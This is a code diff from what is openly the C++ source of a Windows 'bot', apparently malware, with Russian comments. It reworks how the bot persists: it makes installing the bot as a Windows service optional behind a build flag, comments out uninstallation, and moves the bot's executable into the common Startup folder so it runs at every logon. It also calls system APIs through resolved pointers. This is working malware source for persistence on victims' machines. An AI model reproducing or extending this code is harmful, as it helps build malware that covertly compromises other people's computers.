@@ -8,7 +8,13 @@
 #include "BotHosts.h"
 #include "StrConsts.h"
 #include "Pipes.h"
-#include "BotService.h"
+
+#ifdef INSTALL_BOT_AS_SERVICE
+
+	#include "BotService.h"
+
+#endif
+
 //#include "DbgRpt.h"
 
 
@@ -534,6 +540,8 @@ namespace BOT
 	//--------------------------------------------------
 	//  ServiceMain - главная функция сервиса бота
 	//--------------------------------------------------
+#ifdef INSTALL_BOT_AS_SERVICE
+
 	void WINAPI ServiceMain(DWORD argc, char** argv)
 	{
 		// Инициализируем данные сервиса
@@ -569,7 +577,7 @@ namespace BOT
 
 	}
 	//----------------------------------------------------------------------
-
+#endif
 
 
 	//--------------------------------------------------
@@ -645,12 +653,15 @@ string BOT::GetBotPath()
 	if (BotData->BotPath.IsEmpty())
 	{
 		// Создаём путь
-		TMemory Path(MAX_PATH);
-		if (pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
-		{
-			BotData->BotPath =  Path.AsStr();
-        }
-    }
+//		TMemory Path(MAX_PATH);
+//		if (pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
+//		{
+//			BotData->BotPath =  Path.AsStr();
+//        }
+
+		BotData->BotPath =  GetSpecialFolderPathA(CSIDL_COMMON_APPDATA, NULL);
+
+	}
 	return BotData->BotPath;
 }
 //----------------------------------------------------------------------------
@@ -759,11 +770,9 @@ string BOT::GetBotFullExeName()
 {
 	if (BotData->BotExeName.IsEmpty())
 	{
-		BotData->BotExeName = GetBotPath();
-        BotData->BotExeName += GetBotExeName();
+		BotData->BotExeName = GetSpecialFolderPathA(CSIDL_COMMON_STARTUP, GetBotExeName());
 	}
     return BotData->BotExeName;
-   //	return GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
 }
 //----------------------------------------------------------------------------
 
@@ -866,6 +875,8 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 //----------------------------------------------------
 bool BOT::InstallService(const char* FileName)
 {
+#ifdef INSTALL_BOT_AS_SERVICE
+
 	if (!FileExistsA((PCHAR)FileName))
 		return false;
 
@@ -903,6 +914,12 @@ bool BOT::InstallService(const char* FileName)
 		}
 	}
 	return Result;
+
+#else
+
+	return false;
+
+#endif
 }
 
 //----------------------------------------------------
@@ -910,6 +927,7 @@ bool BOT::InstallService(const char* FileName)
 //----------------------------------------------------
 bool BOT::UpdateService(const char* FileName)
 {
+#ifdef INSTALL_BOT_AS_SERVICE
 	if (!File::IsExists((PCHAR)FileName))
 		return false;
 		
@@ -940,6 +958,9 @@ bool BOT::UpdateService(const char* FileName)
 	COREDBG("BotCore", "Стартуем сервис. Результат=%d [Err:%d]", Result, pGetLastError());
 	
 	return Result != 0;
+#else
+	return false;
+#endif
 }
 
 
@@ -947,6 +968,7 @@ bool BOT::UpdateService(const char* FileName)
 // UninstallService - Функция деинсталирует
 //                    сервис бота
 //----------------------------------------------------
+/*
 bool BOT::UninstallService()
 {
 	COREDBG("BotCore", "Деинсталируем сервис");
@@ -970,6 +992,7 @@ bool BOT::UninstallService()
 
 	return Result;
 }
+*/
 
 
 
@@ -977,19 +1000,21 @@ bool BOT::UninstallService()
 // ExecuteService - Функция запускает выполнение
 //                  сервиса
 //----------------------------------------------------
-void BOT::ExecuteService()
-{
-	BotData->ServiceName = GetStr(EStrServiceName);
+#ifdef INSTALL_BOT_AS_SERVICE
+	void BOT::ExecuteService()
+	{
+		BotData->ServiceName = GetStr(EStrServiceName);
 
-	COREDBG("BotService", "Запущен сервис бота %s", BotData->ServiceName.t_str());
+		COREDBG("BotService", "Запущен сервис бота %s", BotData->ServiceName.t_str());
 
-	BotData->ServiceTable[0].lpServiceName = BotData->ServiceName.t_str();
-	BotData->ServiceTable[0].lpServiceProc = ServiceMain;
+		BotData->ServiceTable[0].lpServiceName = BotData->ServiceName.t_str();
+		BotData->ServiceTable[0].lpServiceProc = ServiceMain;
 
-	pStartServiceCtrlDispatcherA(BotData->ServiceTable);
-	COREDBG("BotService", "Сервис завершил работу");
-    pExitProcess(0);
-}
+		pStartServiceCtrlDispatcherA(BotData->ServiceTable);
+		COREDBG("BotService", "Сервис завершил работу");
+		pExitProcess(0);
+	}
+#endif
 
 
 //----------------------------------------------------
